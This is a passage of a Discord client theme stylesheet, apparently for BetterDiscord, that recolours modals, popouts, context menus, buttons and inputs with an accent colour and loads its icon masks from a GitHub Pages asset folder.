.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after,
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	content: "";
	position: absolute;
	background: rgb(var(--vaccentcolor));
}
.attachment-33OFj0 .icon-1kp3fr {
	background-size: 120% !important;
}
.audioMetadata-3zOuGv::before {
	background-position: center -4px !important;
	background-size: 140% !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 9px;
	left: 8px;
	width: 36px;
	height: 48px;
}
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after {
	top: 0;
	left: 5px;
	width: 34px;
	height: 56px;
}
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	width: 100px;
	height: 130px;
}
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::after {
	background: rgb(240, 71, 71);
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.audioMetadata-3zOuGv > *:first-child::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_details.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.unknown-3TPTMr::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/empty.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="acrobat"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.acrobat-3K1PC6::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_acrobat_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ae"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ae-1Y5Jq3::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_ae_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ai"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ai-11KAaB::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_ai_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="archive"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.archive-2hqXug::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_archive_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="audio"] + *::after,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr.audio-14DQXq::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_audio_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="code"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.code-aoB-kL::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.two-3BBQI9::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_code_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="document"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.document-2cvI0u::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.three-27ScFD::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_document_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="photoshop"] + *::after,
.attachment-33OFj0 .icon-1kp3fr[title="ps"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.photoshop-1UWfyZ::after,
.uploadModal-2ifh8j .icon-kyxXVr.ps-2T6Jrl::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_photoshop_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="sketch"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.sketch-ZMuo7D::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_sketch_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="spreadsheet"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.spreadsheet-1QuSej::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.one-2crnLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_spreadsheet_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="video"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.video-27RLEH::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_video_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="webcode"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.webcode-22GGLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_webcode_accent.svg) center/contain no-repeat;
}

/* ----		10.5.	KEYBOARDSHORTCUTSMODAL			---- */

.ddrArrows-lSnH7P .arrow-2enltQ,							/* modal				arrows								*/
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	height: 50px;
	width: 50px;
}
.ddrArrows-lSnH7P .arrow-2enltQ.active-2X6Ewx {
	filter: brightness(130%);
}
.ddrArrows-lSnH7P .arrow-2enltQ {
	position: relative;
	animation: none !important;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/keybinds_arrows_bg.svg) center/contain no-repeat !important;
}
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	content: "";
	position: absolute;
	top: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/keybinds_arrows_accent.svg) center/contain no-repeat;
}
.ddrArrows-lSnH7P .arrow-2enltQ.down-2Ju7Q_ {
	transform: rotate(270deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.up-fkTose {
	transform: rotate(90deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.right-1AEPK3 {
	transform: rotate(180deg);
}


/* ----		10.6.	LOGINSCREEN						---- */

.authBox-hW6HRx a {											/* authobox				links								*/
	color: rgb(var(--vaccentcolor));
}

.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/login_authbox_bg.svg) center/cover no-repeat;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + *::before {
	content: "";
	position: absolute;
	top: -107px;
	width: 124px;
	height: 84px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/login_authbox_mask.svg) center/cover no-repeat;
}

.startOverButton-3q0wUV {									/* authobox				startover								*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.7.	DOWNLOADAPPMODAL				---- */

.downloadApps-wbBFdZ .footer-1nkeBm a {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ {
	border-color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ p {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ .downloadButton-1bWXpg {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ {
	background: rgb(var(--vaccentcolor));
	-webkit-mask-size: cover;
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.apple-1fKN59 {
	-webkit-mask: url(https://discordapp.com/assets/7ddab19e24325212299490c2f413b122.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.windows-29yOum {
	-webkit-mask: url(https://discordapp.com/assets/37ce528f3abf4d735a624309e990acc6.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.linux-15cW1y {
	-webkit-mask: url(https://discordapp.com/assets/f8e3f6e7b2cf5f10aed43243560a1b91.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.ios-Z7K-rr {
	-webkit-mask: url(https://discordapp.com/assets/00a1b0447f0474ecaa767a4bc09fe2ed.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.android-gGrHJu {
	-webkit-mask: url(https://discordapp.com/assets/676bfec9f4343f6fcdf0a12ae313a3de.svg);
}

.browserItem-1mKMYK:hover {
	border-color: rgb(var(--vaccentcolor));
}
.browserItem-1mKMYK:hover .btn-3wPLTq {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}

/* ----		10.8.	GUILDBOOSTMODAL					---- */

															/* modal				boost header						*/
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] {
	object-position: -999999px -999999px;
	width: 96px;
	height: 60px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg),
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + * {
	position: relative;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg)::after,
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + *::after {
	content: "";
	position: absolute;
	top: -132px;
	left: calc((100% - 96px) / 2);
	width: 96px;
	height: 60px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
.badgeIconWithSubscribers-3PlMu9 {							/* modal				sub badge icon						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .icon-QVoPRH {									/* modal				perkicon general					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				tiermarker in progress tier3		*/
#app-mount .tierMarkerInProgress-24LMzJ .currentTierIcon-2gcTCn.tier3Icon-Ku4Ahe {
	color: rgb(var(--vaccentcolor));
}
.tierMarkerAccomplished-2MiXeg {							/* modal				tiermarker accomplished				*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7)) !important;
}
#app-mount .barForeground-3KglC8 {							/* modal				tierbarfill							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .barSecondary-3B1aP2 {							/* modal				previewbarfill						*/
	background: var(--interactive-hover) linear-gradient(90deg, rgba(var(--vaccentcolor), 0.3), rgba(var(--vaccentcolor), 0.3));
}
#app-mount .iconIncluded-24npcq {							/* modal				included perkicon					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .upload-2-2ZMI {									/* modal				perkicon upload						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .animated-XlVkOl {								/* modal				perkicon animated					*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
#app-mount .stream-3mNTxK {									/* modal				perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
#app-mount .tierUnlocked-25K6Kv {							/* modal				tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlocked-1n-OTI {						/* modal				tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.wrapper-3nSjSv {											/* modal				boostaddwrapper						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.wrapper-3nSjSv::before,									/* modal				boostangel							*/
.wrapper-3nSjSv::after {
	content: "";
	position: absolute;
	top: -44px;
	right: -82px;
	width: 168px;
	height: 88px;
}
.wrapper-3nSjSv::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostangel_bg.svg) center/cover no-repeat;
}
.wrapper-3nSjSv::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostangel_accent.svg) center/cover no-repeat;
}
.tierMarkerLabelPlusIcon-1OS7E9 {							/* modal				prebuy icon							*/
	color: rgb(var(--vaccentcolor));
}
.upsellFooterIcon-2105bD path {								/* prebuy popout		footer icon							*/
	fill: rgb(var(--vaccentcolor));
}
.perkIconGuild-KLNhuR {										/* prebuy popout		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
}
.perkIconChatPerks-BnKNFh {									/* prebuy popout		perkicon chat						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}
.perkIconStream-7wqAvn {									/* prebuy popout		perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}

/* ----		10.9.	STREAMSETTINGSMODAL				---- */

.selectorButtonSelected-336oUc,								/* modal				selectorselectedbutton				*/
.selectorButtonSelected-1j4DmC {
	background-color: rgb(var(--vaccentcolor));
}
.badgeUpgrade-1DzdNZ {										/* modal				badgeupgrade						*/
	color: rgb(var(--vaccentcolor));
}
.imageSelected-4Kl81J {										/* modal				imageselected						*/
	border-color: rgb(var(--vaccentcolor));
}
.tile-2silOL:hover .sourceThumbnail-14Iubx {				/* modal				sourcethumbnail						*/
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-14Iubx.selected-3Qtv-u {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}

/* ----		10.10.	DISPATCHERRORMODAL				---- */

.theme-light .closeLink-2MRAUp {							/* modal				closelink							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.11.	CHANGELOGMODAL					---- */

.content-s2SEQO a {											/* modal				link								*/
	color: var(--text-link);
}
.improved-1NJK-y {											/* modal				improved category					*/
	color: rgb(var(--vaccentcolor));
}
.improved-1NJK-y::after {
	background-color: rgb(var(--vaccentcolor));
}

.premiumBanner-rP6H1S {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

/* ----		10.12.	SCREENSHAREMODAL				---- */

.tile-2w4k5N:hover .sourceThumbnail-27dolk {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-27dolk.selected-1nOkyc {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.selectorButton-EEUWed:not(.selectorButtonPremiumRequired-mKMbIu):hover {
	background-color: rgb(var(--vaccentcolor));
}
.selectorButtonSelected-t5V9On {
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.13.	PHONEVERIFICATIONMODAL			---- */

.phoneVerificationModal-OzcDc3 path[fill="rgb(118,134,177)"] {
	fill: rgb(var(--vaccentcolor));
}


/* ~~~~		11.		POPOUTS							~~~~ */

.popoutLeft-3aViER.arrowAlignmentTop-1yftWI::before {
	border-left-color: #rgb(var(--vaccentcolor));
}
.popoutRight-1veHKi.arrowAlignmentTop-1yftWI::before {
	border-right-color: #rgb(var(--vaccentcolor));
}
.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentTop-1yftWI::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentTop-1yftWI::before {
	border-top-color: #rgb(var(--vaccentcolor));
}
.theme-light.contentNarrowMedia-W7SHxH.topArrow-1B63md::before,
.theme-light .contentNarrowNoMedia-Il01H1.topArrow-1B63md::before,
.theme-light.contentWideNoMedia-22TIu6.topArrow-1B63md::before,
.theme-light .contentWideNoMedia-22TIu6.topArrow-1B63md::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}

/* ----		11.1.	CONTEXTMENU						---- */

.colorBrand-ROmMP1,											/* contextmenu			brand								*/
.colorPremium-p4p7qO {										/* contextmenu			premium								*/
	color: rgb(var(--vaccentcolor));
}
.colorDefault-2K3EoJ.focused-3afm-j,
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) {
	background-color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O),
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) {
	background-color: #F04747;
}
.colorDefault-2K3EoJ .radioSelection-1HmrQS {				/* contextmenu			radioselection						*/
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1 .radioSelection-1HmrQS {
	color: #F04747;
}
.colorDefault-2K3EoJ .checkbox-3s5GYZ {						/* contextmenu			checkbox							*/
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1 .checkbox-3s5GYZ {
	color: #F04747;
}
.colorDefault-2K3EoJ.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: #F04747;
}
.colorPremium-p4p7qO .icon-LYJorE {							/* contextmenu			premiumicon							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.2.	USERPOPOUT						---- */

.headerPlaying-j0WQBV {
	background: rgb(var(--vaccentcolor));
}
.headerStreaming-2FjmGz {
	background: #593695;
}

/* ----		11.3.	EMOJIPICKER						---- */

.emojiPicker-3m1S-j .categories-1feg4n .selected-39BZ4S {	/* emojipicker			selected category					*/
	border-bottom-color: rgb(var(--vaccentcolor));
}

/* ----		11.4.	PINS/MENTIONS					---- */

.hasMoreButton-1MELpI {										/* popout				hasmore button						*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.5.	SEARCHPOPOUT					---- */
															/* datepicker			day hover							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected:hover,
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day:not(.react-datepicker__day--disabled):hover {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			day selectd							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected::after {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			hintvalue							*/
#app-mount .datePicker--XZbmJ .datePickerHint-3Q1Udw .hintValue-29ny8Z {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		12.		GENERAL							~~~~ */

.wanderingCubesItem-WPXqao {								/* loading				cubes								*/
	background-color: rgb(var(--vaccentcolor));
}
.chasingDotsItem-2DVNUn {									/* loading				dots								*/
	background-color: rgb(var(--vaccentcolor));
}
.theme-light .path-92Hmty,									/* loading				circle								*/
.theme-dark .path-92Hmty,
.theme-dark .path2-1q7bG_ {
	stroke: rgb(var(--vaccentcolor));
}

/* ----		12.1.	TEXT							---- */

.brand-2-tkdo {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2tjs5J {
	color: rgb(var(--vaccentcolor));
}
.tipTitle-GL9qAt {
	color: rgb(var(--vaccentcolor));
}

/* ----		12.2.	BUTTONS							---- */

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 .spinnerItem-3GlVyU {
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .btn-1PnLxm.btnPrimary-1jluZW:hover:not(:disabled),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):hover,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background: var(--vaccentcolor-hover);
}
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):active,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background: var(--vaccentcolor-active);
}
#app-mount .btn-1PnLxm.btnPrimary-1jluZW,
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):disabled {
	background: rgb(var(--vaccentcolor));
}

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:hover,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:active,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91,
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:disabled {
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:hover,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	border-color: rgba(var(--vaccentcolor), 0.6);
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:active,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:disabled {
	border-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:hover,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.15);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:active,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-color: rgba(var(--vaccentcolor), 0.2);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:disabled {
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor));
}
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91:hover .contents-18-Yxp,
#app-mount .lookLink-9FtZy-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover .contents-18-Yxp {
	background-image: linear-gradient(0deg, transparent, transparent 1px, rgb(var(--vaccentcolor)) 0, rgb(var(--vaccentcolor)) 2px, transparent 0);
	color: rgb(var(--vaccentcolor));
}

/* ----		12.3.	INPUTS							---- */

.input-cIJ7To.focused-1mmYsC,								/* textinput			focused								*/
.input-cIJ7To:focus {
	border-color: rgb(var(--vaccentcolor));
}
.input-cIJ7To.error-2O5WFJ {
	border-color: #f04747;
}
.input-cIJ7To.success-2-F980 {
	border-color: #43b581;
}
.focused-1mmYsC {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .prefixInput-14nUik.focused-2QzoMt {
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked 							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe .checkboxElement-1qV33p:checked + span {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked alt							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe.alt-6FvZrq .checkboxElement-1qV33p:checked + span::after {
	border-color: rgb(var(--vaccentcolor));
}

.checked-3_4uQ9[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.checked-3_4uQ9[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.container-3auIfb {											/* switch				unchecked							*/
	background-color: rgb(114, 118, 125) !important;
	transition: background-color .1s ease-out;
}															/* switch				checked								*/
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:hover,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:hover {
	background: var(--vaccentcolor-hover);
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:active,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:active {
	background: var(--vaccentcolor-active);
}
.container-3auIfb path[fill] {
	fill: rgb(114, 118, 125) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"] path[fill],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] path[fill] {
	fill: rgb(var(--vaccentcolor)) !important;
}

.barFill-23-gu- {											/* slider				barfill								*/
	background: rgb(var(--vaccentcolor));
}
.mediaBarGrabber-1FqnbN,									/* progessbar			grabber								*/
.mediaBarProgress-1xaPtl,									/* progessbar			barfill								*/
.mediaBarProgress-1xaPtl::after,
.mediaBarProgress-1xaPtl::before {
	background-color: rgb(var(--vaccentcolor));
}
.mediaBarInteraction-37i2O4:hover .mediaBarGrabber-1FqnbN,
.mediaBarInteractionDragging-2QurIZ .mediaBarGrabber-1FqnbN {
	background-color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}

.theme-light .select-1Pkeg4:focus,							/* dropdown select		nitro subscription					*/
.theme-light .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-light .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-light .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) #b9bbbe;
}
.theme-dark .select-1Pkeg4:focus,
